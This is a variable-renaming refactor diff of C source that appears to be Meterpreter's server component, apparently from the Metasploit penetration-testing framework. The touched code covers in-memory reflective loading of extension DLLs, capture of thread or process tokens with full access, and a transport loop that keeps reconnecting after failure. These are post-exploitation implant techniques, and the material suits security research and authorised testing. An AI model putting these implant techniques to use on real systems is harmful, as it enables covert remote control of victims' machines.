@@ -56,60 +56,60 @@ DWORD server_sessionid()
 {
 	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );
 
-	static PROCESSIDTOSESSIONID pProcessIdToSessionId = NULL;
-	HMODULE hKernel   = NULL;
-	DWORD dwSessionId = 0;
+	static PROCESSIDTOSESSIONID processIdToSessionId = NULL;
+	HMODULE kernel   = NULL;
+	DWORD sessionId = 0;
 
 	do
 	{
-		if (!pProcessIdToSessionId)
+		if (!processIdToSessionId)
 		{
-			hKernel = LoadLibraryA("kernel32.dll");
-			if (hKernel)
+			kernel = LoadLibraryA("kernel32.dll");
+			if (kernel)
 			{
-				pProcessIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(hKernel, "ProcessIdToSessionId");
+				processIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(kernel, "ProcessIdToSessionId");
 			}
 		}
 
-		if (!pProcessIdToSessionId)
+		if (!processIdToSessionId)
 		{
 			break;
 		}
 
-		if (!pProcessIdToSessionId(GetCurrentProcessId(), &dwSessionId))
+		if (!processIdToSessionId(GetCurrentProcessId(), &sessionId))
 		{
-			dwSessionId = -1;
+			sessionId = -1;
 		}
 
 	} while( 0 );
 
-	if (hKernel)
+	if (kernel)
 	{
-		FreeLibrary(hKernel);
+		FreeLibrary(kernel);
 	}
 
-	return dwSessionId;
+	return sessionId;
 }
 
 /*!
  * @brief Load any stageless extensions that might be present in the current payload.
- * @param pRemote Pointer to the remote instance.
+ * @param remote Pointer to the remote instance.
  * @param fd The socket descriptor passed to metsrv during intialisation.
  */
-VOID load_stageless_extensions(Remote* pRemote, ULONG_PTR fd)
+VOID load_stageless_extensions(Remote* remote, ULONG_PTR fd)
 {
-	LPBYTE pExtensionStart = (LPBYTE)fd + sizeof(DWORD);
-	DWORD size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));
+	LPBYTE extensionStart = (LPBYTE)fd + sizeof(DWORD);
+	DWORD size = *((LPDWORD)(extensionStart - sizeof(DWORD)));
 
 	while (size > 0)
 	{
-		dprintf("[SERVER] Extension located at 0x%p: %u bytes", pExtensionStart, size);
-		HMODULE hLibrary = LoadLibraryR(pExtensionStart, size);
-		dprintf("[SERVER] Extension located at 0x%p: %u bytes loaded to %x", pExtensionStart, size, hLibrary);
-		initialise_extension(hLibrary, TRUE, pRemote, NULL, extensionCommands);
+		dprintf("[SERVER] Extension located at 0x%p: %u bytes", extensionStart, size);
+		HMODULE hLibrary = LoadLibraryR(extensionStart, size);
+		dprintf("[SERVER] Extension located at 0x%p: %u bytes loaded to %x", extensionStart, size, hLibrary);
+		initialise_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
 
-		pExtensionStart += size + sizeof(DWORD);
-		size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));
+		extensionStart += size + sizeof(DWORD);
+		size = *((LPDWORD)(extensionStart - sizeof(DWORD)));
 	}
 
 	dprintf("[SERVER] All stageless extensions loaded");
@@ -152,13 +152,13 @@ static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
 DWORD server_setup(SOCKET fd)
 {
 	THREAD* serverThread = NULL;
-	Remote* pRemote = NULL;
-	char cStationName[256] = { 0 };
-	char cDesktopName[256] = { 0 };
+	Remote* remote = NULL;
+	char stationName[256] = { 0 };
+	char desktopName[256] = { 0 };
 	DWORD res = 0;
 
 	// first byte of the URL indites 's' if it's stageless
-	BOOL bStageless = global_config.url[0] == 's';
+	BOOL isStageless = global_config.url[0] == 's';
 
 	dprintf("[SERVER] Initializing...");
 
@@ -180,56 +180,56 @@ DWORD server_setup(SOCKET fd)
 
 			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);
 
-			if (!(pRemote = remote_allocate()))
+			if (!(remote = remote_allocate()))
 			{
 				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 				break;
 			}
 
 			// Store our thread handle
-			pRemote->hServerThread = serverThread->handle;
+			remote->hServerThread = serverThread->handle;
 
 			// Store our process token
-			if (!OpenThreadToken(pRemote->hServerThread, TOKEN_ALL_ACCESS, TRUE, &pRemote->hServerToken))
+			if (!OpenThreadToken(remote->hServerThread, TOKEN_ALL_ACCESS, TRUE, &remote->hServerToken))
 			{
-				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &pRemote->hServerToken);
+				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->hServerToken);
 			}
 
 			// Copy it to the thread token
-			pRemote->hThreadToken = pRemote->hServerToken;
+			remote->hThreadToken = remote->hServerToken;
 
 			// Save the initial session/station/desktop names...
-			pRemote->dwOrigSessionId = server_sessionid();
-			pRemote->dwCurrentSessionId = pRemote->dwOrigSessionId;
-			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &cStationName, 256, NULL);
-			pRemote->cpOrigStationName = _strdup(cStationName);
-			pRemote->cpCurrentStationName = _strdup(cStationName);
-			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &cDesktopName, 256, NULL);
-			pRemote->cpOrigDesktopName = _strdup(cDesktopName);
-			pRemote->cpCurrentDesktopName = _strdup(cDesktopName);
+			remote->dwOrigSessionId = server_sessionid();
+			remote->dwCurrentSessionId = remote->dwOrigSessionId;
+			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &stationName, 256, NULL);
+			remote->cpOrigStationName = _strdup(stationName);
+			remote->cpCurrentStationName = _strdup(stationName);
+			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &desktopName, 256, NULL);
+			remote->cpOrigDesktopName = _strdup(desktopName);
+			remote->cpCurrentDesktopName = _strdup(desktopName);
 
 			dprintf("[SERVER] Registering dispatch routines...");
 			register_dispatch_routines();
 
-			if (bStageless)
+			if (isStageless)
 			{
 				// in the case of stageless payloads, fd contains a pointer to the extensions
 				// to load
 				dprintf("[SERVER] Loading stageless extensions");
-				load_stageless_extensions(pRemote, (ULONG_PTR)fd);
+				load_stageless_extensions(remote, (ULONG_PTR)fd);
 			}
 
-			// allocate the "next transport" information
+			// allocate the "next transport" information based off the global configuration
 			dprintf("[SERVER] creating transport");
-			pRemote->nextTransport = transport_create(&global_config, bStageless);
+			remote->nextTransport = transport_create(&global_config, isStageless);
 
-			while (pRemote->nextTransport)
+			while (remote->nextTransport)
 			{
 				// Work off the next transport
-				pRemote->transport = pRemote->nextTransport;
+				remote->transport = remote->nextTransport;
 
-				dprintf("[SERVER] initialising transport 0x%p", pRemote->transport->transport_init);
-				if (pRemote->transport->transport_init && !pRemote->transport->transport_init(pRemote, fd))
+				dprintf("[SERVER] initialising transport 0x%p", remote->transport->transport_init);
+				if (remote->transport->transport_init && !remote->transport->transport_init(remote, fd))
 				{
 					// Hackety hack hack!
 					Sleep(5000);
@@ -237,38 +237,38 @@ DWORD server_setup(SOCKET fd)
 				}
 
 				// once initialised, we'll clean up the next transport so that we don't try again
-				pRemote->nextTransport = NULL;
+				remote->nextTransport = NULL;
 
-				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", pRemote->transport, pRemote->transport->ctx);
-				DWORD dispatchResult = pRemote->transport->server_dispatch(pRemote, serverThread);
+				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
+				DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);
 
-				if (pRemote->transport->transport_deinit)
+				if (remote->transport->transport_deinit)
 				{
-					pRemote->transport->transport_deinit(pRemote);
+					remote->transport->transport_deinit(remote);
 				}
 
 				// If the transport mechanism failed, then we should loop until we're able to connect back again.
 				// But if it was successful, and this is a valid exit, then we should clean up and leave.
 				if (dispatchResult == ERROR_SUCCESS)
 				{
-					pRemote->transport->transport_destroy(pRemote);
+					remote->transport->transport_destroy(remote);
 				}
 				else
 				{
 					// try again!
-					if (pRemote->transport->transport_reset)
+					if (remote->transport->transport_reset)
 					{
-						pRemote->transport->transport_reset(pRemote->transport);
+						remote->transport->transport_reset(remote->transport);
 					}
-					pRemote->nextTransport = pRemote->transport;
+					remote->nextTransport = remote->transport;
 				}
 			}
 
 			dprintf("[SERVER] Deregistering dispatch routines...");
-			deregister_dispatch_routines(pRemote);
+			deregister_dispatch_routines(remote);
 		} while (0);
 
-		remote_deallocate(pRemote);
+		remote_deallocate(remote);
 	}
 	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
 	{
